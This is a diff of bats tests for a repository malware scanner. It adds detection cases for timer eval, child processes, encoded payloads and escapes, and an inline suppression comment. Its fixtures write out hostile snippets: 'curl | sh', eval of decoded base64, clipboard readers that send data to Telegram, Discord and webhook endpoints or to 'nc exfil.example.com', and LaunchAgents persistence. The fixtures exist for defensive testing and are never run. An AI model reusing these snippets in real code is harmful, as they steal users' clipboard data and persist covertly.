@@ -222,6 +222,26 @@ write_file() {
   assert_success
 }
 
+@test "dynamic timer execution: a string first argument is flagged (classic timer-eval shape)" {
+  write_file "dirty.js" 'setTimeout("doEvilThing()", 1000)'
+  scan
+  assert_failure
+  assert_output --partial "Dynamic timer execution"
+}
+
+@test "dynamic timer execution: an arrow-function first argument is not flagged" {
+  write_file "ok.js" 'setTimeout(() => setCopied(null), 2000);'
+  write_file "ok2.js" 'window.setTimeout(() => inputRef.current?.focus(), 100);'
+  scan
+  assert_success
+}
+
+@test "dynamic timer execution: a function-expression first argument is not flagged" {
+  write_file "ok.js" 'setInterval(function tick() { render(); }, 16);'
+  scan
+  assert_success
+}
+
 @test "child-process execution: execSync( and spawn( are flagged" {
   write_file "a.js" 'execSync("curl -s http://x | sh")'
   write_file "b.js" 'spawn("ls", ["-la"])'
@@ -243,6 +263,34 @@ write_file() {
   write_file "ok.js" 'const cp = require("child_process")'
   scan
   assert_success
+}
+
+@test "child-process execution: a literal command with a Node options object is not flagged" {
+  write_file "ok.js" 'const out = execSync("git diff --cached --name-only", { cwd: REPO_ROOT, encoding: "utf8" });'
+  write_file "ok2.js" 'const result = spawnSync("wp", wpArgs, { stdio: "inherit" });'
+  scan
+  assert_success
+}
+
+@test "child-process execution: a variable command with a Node options object is still flagged" {
+  write_file "dirty.js" 'const output = execSync(cmd, { encoding: "utf8" });'
+  scan
+  assert_failure
+  assert_output --partial "Child-process execution"
+}
+
+@test "child-process execution: an interpolated template command is still flagged" {
+  write_file "dirty.js" 'return execSync(`jj ${args}`, { encoding: "utf8" });'
+  scan
+  assert_failure
+  assert_output --partial "Child-process execution"
+}
+
+@test "child-process execution: string concatenation into the command is still flagged" {
+  write_file "dirty.js" 'execSync("curl " + url, { encoding: "utf8" })'
+  scan
+  assert_failure
+  assert_output --partial "Child-process execution"
 }
 
 @test "network access: import from http/https is flagged" {
@@ -279,24 +327,67 @@ write_file() {
   assert_output --partial "Computed global properties"
 }
 
-@test "encoded payload primitives: atob( and Buffer.from( are flagged" {
-  write_file "a.js" 'atob("c2hlbGw=")'
-  write_file "b.js" 'Buffer.from("c2hlbGw=", "base64")'
+@test "encoded payload primitives: atob( immediately eval'd is flagged" {
+  write_file "a.js" 'eval(atob("c2hlbGw="))'
   scan
   assert_failure
   assert_output --partial "Encoded payload primitives"
   assert_equal "$(count_in_output 'a.js:1')" 1
-  assert_equal "$(count_in_output 'b.js:1')" 1
 }
 
-@test "hex and unicode escapes are flagged" {
-  write_file "hex.js" 'var s = "\x41\x42"'
-  write_file "uni.js" 'var u = "\u0041"'
+@test "encoded payload primitives: a decode followed by eval( a few lines later is flagged" {
+  write_file "a.js" \
+    'const payload = atob("c2hlbGw=");' \
+    'doSomethingElse();' \
+    'eval(payload);'
+  scan
+  assert_failure
+  assert_output --partial "Encoded payload primitives"
+  assert_equal "$(count_in_output 'a.js:1')" 1
+}
+
+@test "encoded payload primitives: a long embedded base64 literal is flagged with no execution nearby" {
+  write_file "dirty.js" \
+    'const blob = atob("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eg==");'
+  scan
+  assert_failure
+  assert_output --partial "Encoded payload primitives"
+}
+
+@test "encoded payload primitives: decoding a runtime value with no execution nearby is not flagged" {
+  write_file "ok.js" 'const decoded = atob(authorizationHeader.slice("Basic ".length));'
+  write_file "ok2.js" 'return Buffer.from(user + ":" + pass).toString("base64");'
+  write_file "ok3.js" 'return Buffer.concat(chunks).toString("utf8");'
+  scan
+  assert_success
+}
+
+@test "hex and unicode escapes: a long adjacent run is still flagged" {
+  write_file "hex.js" 'var s = "\x68\x65\x6c\x6c\x6f"'
+  write_file "uni.js" 'var u = "\u0048\u0065\u006c\u006c\u006f"'
   scan
   assert_failure
   assert_output --partial "Hex or Unicode string escapes"
   assert_equal "$(count_in_output 'hex.js:1')" 1
   assert_equal "$(count_in_output 'uni.js:1')" 1
+}
+
+@test "hex and unicode escapes: two adjacent escapes (a short pair) are not flagged" {
+  write_file "pair.js" 'var s = "\x41\x42"'
+  scan
+  assert_success
+}
+
+@test "hex and unicode escapes: an isolated hex escape is not flagged (ANSI color code)" {
+  write_file "ansi.js" 'const red = (s) => `\x1b[31m${s}\x1b[0m`;'
+  scan
+  assert_success
+}
+
+@test "hex and unicode escapes: an isolated unicode escape is not flagged" {
+  write_file "uni.js" 'const s = str.replace(/</g, "\u003c");'
+  scan
+  assert_success
 }
 
 @test "string-table obfuscation: _0x with 3+ hex digits is flagged" {
@@ -317,6 +408,13 @@ write_file() {
   scan
   assert_failure
   assert_output --partial "Suspicious decoder/string-table helpers"
+}
+
+@test "decoder/string-table helpers: charCodeAt( alone is not flagged" {
+  write_file "ok.js" 'const char = str.charCodeAt(i);'
+  write_file "ok2.js" 'hash = (hash << 5) + hash + str.charCodeAt(i);'
+  scan
+  assert_success
 }
 
 @test "runtime source construction: new Function( is flagged" {
@@ -568,4 +666,246 @@ write_file() {
   assert_output --partial "postinstall (script)"
   assert_output --partial "preinstall (script)"
   assert_equal "$(count_in_output '(script)')" 2
+}
+
+# -------------------------------------------------------------------------------
+# Inline suppression (am-i-compromised-ignore)
+# -------------------------------------------------------------------------------
+
+@test "suppression: a same-line marker with a reason clears the scan" {
+  write_file "reviewed.js" 'eval("1") // am-i-compromised-ignore: reviewed, see ticket SEC-42'
+  scan
+  assert_success
+  assert_output --partial "1 finding suppressed by inline comment"
+  assert_output --partial "reason: reviewed, see ticket SEC-42"
+}
+
+@test "suppression: a marker on the line before the finding also clears it" {
+  write_file "reviewed.js" \
+    '// am-i-compromised-ignore: bee movie joke string, not code' \
+    'eval("1")'
+  scan
+  assert_success
+  assert_output --partial "reviewed.js:2"
+  assert_output --partial "reason: bee movie joke string, not code"
+}
+
+@test "suppression: a marker with no reason does not suppress anything" {
+  write_file "dirty.js" 'eval("1") // am-i-compromised-ignore:'
+  scan
+  assert_failure
+  assert_output --partial "Dynamic code execution"
+  refute_output --partial "suppressed"
+}
+
+@test "suppression: is honored in non-JS comment syntax" {
+  write_file "reviewed.py" 'eval("1")  # am-i-compromised-ignore: sandboxed constant, reviewed'
+  scan
+  assert_success
+  assert_output --partial "reason: sandboxed constant, reviewed"
+}
+
+@test "suppression: suppressed findings are counted separately and do not hide real ones" {
+  write_file "reviewed.js" 'eval("1") // am-i-compromised-ignore: reviewed, see ticket SEC-42'
+  write_file "dirty.js" 'eval("2")'
+  scan
+  assert_failure
+  # only dirty.js counts toward the gate; reviewed.js is suppressed, not silent
+  assert_output --partial "security-gate: FAILED — 1 finding across 1 file"
+  assert_output --partial "1 finding suppressed by inline comment"
+  assert_output --partial "dirty.js:1"
+  assert_output --partial "reviewed.js:1"
+  assert_output --partial "reason: reviewed, see ticket SEC-42"
+}
+
+@test "suppression: a marker only suppresses its own line, not a different finding two lines away" {
+  write_file "mixed.js" \
+    'eval("1") // am-i-compromised-ignore: reviewed' \
+    'ok()' \
+    'eval("3")'
+  scan
+  assert_failure
+  assert_output --partial "security-gate: FAILED — 1 finding across 1 file"
+  assert_output --partial "mixed.js:3"
+  assert_output --partial "1 finding suppressed by inline comment"
+}
+
+# -------------------------------------------------------------------------------
+# Clipboard / keystroke / screen capture + exfiltration
+#
+# Reproduces the class missed in September 2026: a hidden Node script polled the
+# clipboard and forwarded every copy to a Telegram bot. Fixtures are synthetic
+# and never executed — they are only written and scanned. The token is a fake
+# placeholder (`123456789:AAAA…`), not a working credential.
+# -------------------------------------------------------------------------------
+
+# Built at runtime so no bot-token literal sits in the repo for secret scanners to flag.
+FAKE_TELEGRAM_TOKEN="123456789:$(printf '%035d' 0 | tr 0 A)"
+
+@test "capture + exfil: a clipboard read sent to a Telegram bot is flagged" {
+  write_file "stealer.js" \
+    'const clipboardy = require("clipboardy")' \
+    "const token = \"${FAKE_TELEGRAM_TOKEN}\"" \
+    'setInterval(() => {' \
+    '  const clip = clipboardy.readSync();' \
+    '  fetch(`https://api.telegram.org/bot${token}/sendMessage?text=${clip}`);' \
+    '}, 5000);'
+  scan
+  assert_failure
+  assert_output --partial "stealer.js:1"
+  assert_output --partial "Clipboard/keystroke/screen capture with remote exfiltration"
+}
+
+@test "capture + exfil: pbpaste polling piped to a Telegram webhook in a shell script is flagged" {
+  write_file "clip.sh" \
+    '#!/bin/bash' \
+    'while true; do' \
+    "  pbpaste | curl -s \"https://api.telegram.org/bot${FAKE_TELEGRAM_TOKEN}/sendMessage\" --data-binary @- >/dev/null" \
+    '  sleep 5' \
+    'done'
+  scan
+  assert_failure
+  assert_output --partial "clip.sh:3"
+  assert_output --partial "Clipboard/keystroke/screen capture with remote exfiltration"
+}
+
+@test "capture + exfil: an extensionless shebang script is scanned" {
+  write_file "sync-agent" \
+    '#!/bin/bash' \
+    'pbpaste | curl -s "https://discord.com/api/webhooks/123/abc" --data-binary @-'
+  scan
+  assert_failure
+  assert_output --partial "sync-agent:2"
+  assert_output --partial "Clipboard/keystroke/screen capture with remote exfiltration"
+}
+
+@test "capture + exfil: a clipboard read piped to nc is flagged" {
+  write_file "pipe.sh" \
+    '#!/bin/bash' \
+    'pbpaste | nc exfil.example.com 4444'
+  scan
+  assert_failure
+  assert_output --partial "pipe.sh:2"
+  assert_output --partial "Clipboard/keystroke/screen capture with remote exfiltration"
+}
+
+@test "capture + exfil: keystroke and screen capture with an exfil endpoint is flagged" {
+  write_file "spy.py" \
+    'import pyperclip' \
+    'from pynput import keyboard' \
+    'import requests' \
+    'clip = pyperclip.paste()' \
+    'requests.post("https://webhook.site/abc123", data=clip)'
+  scan
+  assert_failure
+  assert_output --partial "spy.py:1"
+  assert_output --partial "Clipboard/keystroke/screen capture with remote exfiltration"
+}
+
+@test "single signal: a hardcoded Telegram bot token is flagged on its own" {
+  write_file "config.sh" "TELEGRAM_BOT_TOKEN=\"${FAKE_TELEGRAM_TOKEN}\""
+  scan
+  assert_failure
+  assert_output --partial "config.sh:1"
+  assert_output --partial "Telegram bot token literal"
+}
+
+@test "single signal: a background node launcher with a pid-file lock is flagged" {
+  write_file "monitor.sh" \
+    '#!/bin/bash' \
+    'cd "$(dirname "$0")"' \
+    'if [ -f .monitor.pid ]; then exit 0; fi' \
+    'nohup node tray_helper.js >> monitor.log 2>&1 &' \
+    'echo $! > .monitor.pid'
+  scan
+  assert_failure
+  assert_output --partial "monitor.sh:4"
+  assert_output --partial "Background node launcher with a pid-file lock"
+}
+
+@test "single signal: a launcher whose sibling payload captures and exfiltrates is flagged as the payload wrapper" {
+  write_file "monitor.sh" \
+    '#!/bin/bash' \
+    'cd "$(dirname "$0")"' \
+    'if [ -f .monitor.pid ]; then exit 0; fi' \
+    'nohup node tray_helper.js >> monitor.log 2>&1 &' \
+    'echo $! > .monitor.pid'
+  write_file "tray_helper.js" \
+    'const clipboardy = require("clipboardy")' \
+    "fetch(\"https://api.telegram.org/bot${FAKE_TELEGRAM_TOKEN}/sendMessage?text=\" + clipboardy.readSync())"
+  scan
+  assert_failure
+  assert_output --partial "monitor.sh:4"
+  assert_output --partial "Background node launcher wraps a capture-and-exfiltrate payload"
+  assert_output --partial "tray_helper.js:1"
+  assert_output --partial "Clipboard/keystroke/screen capture with remote exfiltration"
+}
+
+@test "single signal: a persistence writer beside a capture call is flagged" {
+  write_file "persist.sh" \
+    '#!/bin/bash' \
+    'pbpaste > /tmp/clip.txt' \
+    'mkdir -p ~/Library/LaunchAgents' \
+    'cp ./com.x.plist ~/Library/LaunchAgents/ && launchctl load ~/Library/LaunchAgents/com.x.plist'
+  scan
+  assert_failure
+  assert_output --partial "persist.sh:3"
+  assert_output --partial "Persistence installed by a script that captures input"
+}
+
+@test "single signal: a capture-shaped file name that reads the clipboard is flagged" {
+  write_file "clip-monitor.js" 'const clipboardy = require("clipboardy"); console.log(clipboardy.readSync())'
+  scan
+  assert_failure
+  assert_output --partial "clip-monitor.js:1"
+  assert_output --partial "Capture-named script reads the clipboard or input"
+}
+
+@test "no false positive: a benign clipboard copy utility is not flagged" {
+  write_file "copy.js" \
+    'const clipboardy = require("clipboardy")' \
+    'console.log(clipboardy.readSync())' \
+    'clipboardy.writeSync("done")'
+  scan
+  assert_success
+}
+
+@test "no false positive: a Telegram notifier with exfil but no capture is not flagged" {
+  write_file "notify.js" \
+    'const token = process.env.TELEGRAM_BOT_TOKEN' \
+    'fetch(`https://api.telegram.org/bot${token}/sendMessage`, { method: "POST" })'
+  scan
+  assert_success
+}
+
+@test "no false positive: a markdown doc mentioning clipboard and telegram is not flagged" {
+  write_file "README.md" \
+    '# Notes' \
+    'Use pbpaste to read the clipboard and POST it to https://api.telegram.org/bot/sendMessage.'
+  scan
+  assert_success
+}
+
+@test "no false positive: a capture + exfil combo under node_modules is not flagged" {
+  write_file "node_modules/evil/clip.js" \
+    'const c = require("clipboardy")' \
+    "fetch(\"https://api.telegram.org/bot${FAKE_TELEGRAM_TOKEN}/sendMessage\")"
+  scan
+  assert_success
+}
+
+@test "no false positive: a plain nohup launcher without a pid lock is not flagged" {
+  write_file "run.sh" '#!/bin/bash' 'nohup node server.js >> out.log 2>&1 &'
+  scan
+  assert_success
+}
+
+@test "suppression: an inline marker clears a capture-and-exfil finding" {
+  write_file "reviewed.js" \
+    'const clipboardy = require("clipboardy") // am-i-compromised-ignore: reviewed local clipboard helper' \
+    "fetch(\"https://api.telegram.org/bot${FAKE_TELEGRAM_TOKEN}/sendMessage\")"
+  scan
+  assert_success
+  assert_output --partial "1 finding suppressed by inline comment"
+  assert_output --partial "reason: reviewed local clipboard helper"
 }
